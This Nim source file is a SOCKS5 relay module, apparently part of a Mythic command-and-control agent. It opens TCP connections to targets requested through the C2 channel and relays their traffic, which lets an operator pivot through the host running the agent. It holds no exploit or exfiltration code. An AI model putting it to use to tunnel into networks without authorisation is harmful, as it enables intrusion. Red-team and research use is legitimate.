## SOCKS5 connection manager.
## Maintains a table of server_id → TCP socket.
## A reader thread per connection drains the socket into a channel;
## the main agent loop writes incoming Mythic data to the socket.
import std/[net, locks]
import ./socks5

const MaxSocksConns* = 64

type
  SocksConnState = enum
    scsPending    ## waiting for CONNECT request parse
    scsRelay      ## connected and relaying

## Parallel arrays (avoids GC issues when sharing state with threads)
var sServerId: array[MaxSocksConns, int]
var sSocket:   array[MaxSocksConns, Socket]
var sState:    array[MaxSocksConns, SocksConnState]
var sBuf:      array[MaxSocksConns, string]   ## buffered incoming data
var sAlive:    array[MaxSocksConns, bool]
var sOutChan:  array[MaxSocksConns, Channel[string]]
var sThread:   array[MaxSocksConns, Thread[int]]
var sCount:    int = 0
var sLock:     Lock
var sExitChan: Channel[int]   ## server_ids of closed connections
initLock(sLock)
sExitChan.open()

for i in 0 ..< MaxSocksConns:
  sOutChan[i].open()

# ---------------------------------------------------------------------------

proc socketReaderProc(idx: int) {.thread.} =
  ## Reads from TCP socket and pushes data to sOutChan[idx].
  ## Blocks on recv (no timeout) — unblocks when socket is closed.
  var buf = newString(65536)
  while sAlive[idx]:
    {.cast(gcsafe).}:
      try:
        let n = sSocket[idx].recv(buf, 65536)
        if n <= 0:
          sAlive[idx] = false
          break
        sOutChan[idx].send(buf[0 ..< n])
      except:
        sAlive[idx] = false
        break
  ## Notify main loop that this connection is closed
  {.cast(gcsafe).}:
    sExitChan.send(sServerId[idx])

proc socksFindIdx(serverId: int): int {.inline.} =
  for i in 0 ..< sCount:
    if sAlive[i] and sServerId[i] == serverId:
      return i
  return -1

# ---------------------------------------------------------------------------

proc socksHandleData*(serverId: int, rawData: string,
                      exit: bool): seq[(int, string)] =
  ## Called from the main loop with data from Mythic.
  ## Returns (server_id, bytes_to_send_back) pairs.
  result = @[]

  if exit:
    let i = socksFindIdx(serverId)
    if i >= 0:
      sAlive[i] = false
      try: sSocket[i].close() except: discard
    return

  let i = socksFindIdx(serverId)

  if i < 0:
    ## New connection — first packet is the SOCKS5 CONNECT request.
    if sCount >= MaxSocksConns: return
    let idx = sCount
    inc sCount
    sServerId[idx] = serverId
    sState[idx]    = scsPending
    sBuf[idx]      = rawData
    sAlive[idx]    = true

    let (target, ok) = socks5ParseConnect(sBuf[idx])
    if not ok:
      ## Bad or incomplete CONNECT — refuse
      result.add((serverId, socks5ConnectReply(false)))
      sAlive[idx] = false
      return

    ## Establish TCP connection to the target
    try:
      sSocket[idx] = newSocket()
      sSocket[idx].connect(target.host, Port(target.port))
      ## Send success reply
      result.add((serverId, socks5ConnectReply(true)))
      sState[idx] = scsRelay
      sBuf[idx] = ""
      createThread(sThread[idx], socketReaderProc, idx)
    except Exception as e:
      result.add((serverId, socks5ConnectReply(false)))
      sAlive[idx] = false
    return

  ## Existing connection — relay data to the TCP socket.
  if sState[i] == scsRelay and rawData.len > 0:
    try:
      sSocket[i].send(rawData)
    except:
      sAlive[i] = false

proc socksCollectExits*(): seq[int] =
  ## Return server_ids of connections that have just closed.
  result = @[]
  while true:
    let r = sExitChan.tryRecv()
    if not r.dataAvailable: break
    result.add(r.msg)

proc socksCollect*(): seq[(int, string)] =
  ## Drain buffered TCP→Mythic data from all active connections.
  result = @[]
  for i in 0 ..< sCount:
    if not sAlive[i]: continue
    while true:
      let r = sOutChan[i].tryRecv()
      if not r.dataAvailable: break
      result.add((sServerId[i], r.msg))
